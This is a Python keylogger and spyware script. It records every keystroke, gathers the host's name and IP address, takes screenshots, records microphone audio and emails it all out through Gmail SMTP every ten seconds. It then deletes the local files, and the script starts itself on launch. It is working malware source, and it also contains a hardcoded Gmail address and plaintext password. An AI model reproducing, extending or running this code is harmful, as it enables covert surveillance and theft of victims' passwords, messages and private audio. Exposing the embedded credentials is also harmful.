import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class KeyLogger:
    def __init__(self, report_interval_seconds, email, password):
        self.report_interval = report_interval_seconds
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password
        self.timer = None  # Timer object for periodic reporting

    def append_log(self, string):
        self.log += string

    def on_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.append_log(current_key)

    def send_email(self, subject, message, attachment=None):
        try:
            sender_email = self.email
            receiver_email = self.email  # Send to self for testing

            # Create the email
            msg = MIMEMultipart()
            msg['From'] = sender_email
            msg['To'] = receiver_email
            msg['Subject'] = subject

            # Attach the message body
            msg.attach(MIMEText(message, 'plain'))

            if attachment:
                # Attach the file
                with open(attachment, "rb") as file:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(file.read())

                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename= {attachment}",
                )
                msg.attach(part)

            # Connect to Gmail SMTP server
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(sender_email, receiver_email, msg.as_string())
                print(f"Email sent successfully! Subject: {subject}")
        except smtplib.SMTPException as e:
            print(f"Failed to send email: {e}")

    def report(self):
        try:
            # Gather system information
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            system_info = f"Hostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n\n"

            # Take screenshot
            screenshot_file = "screenshot.png"
            pyscreenshot.grab().save(screenshot_file)

            # Record microphone
            fs = 44100
            seconds = 5  # Recording duration
            audio_file = "audio.wav"
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)  # Specify 2 channels
            sd.wait()

            # Write microphone recording to WAV file
            with wave.open(audio_file, 'wb') as wf:
                wf.setnchannels(2)  # Set number of channels
                wf.setsampwidth(2)  # Set sample width in bytes
                wf.setframerate(fs)  # Set frame rate
                wf.writeframes(recording.tobytes())

            # Compose email message
            message = system_info + "Keylogger Report\n\n" + self.log

            # Send email with attachments
            self.send_email("Keylogger Report", message, attachment=screenshot_file)
            self.send_email("Keylogger Report", message, attachment=audio_file)

            # Clean up files
            os.remove(screenshot_file)
            os.remove(audio_file)

            # Reset log
            self.log = ""

            # Schedule next report
            self.timer = threading.Timer(self.report_interval, self.report)
            self.timer.start()

        except Exception as e:
            print(f"Error in report function: {e}")

    def start(self):
        # Start initial report
        self.report()

        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.on_key_press)
        with keyboard_listener:
            keyboard_listener.join()

    def stop(self):
        # Cancel timer if it exists
        if self.timer:
            self.timer.cancel()


# Configure email and password
EMAIL_ADDRESS = "xdlolol963@gmail.com"
EMAIL_PASSWORD = "chintu2001"

# Initialize and start keylogger
keylogger = KeyLogger(10, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.start()






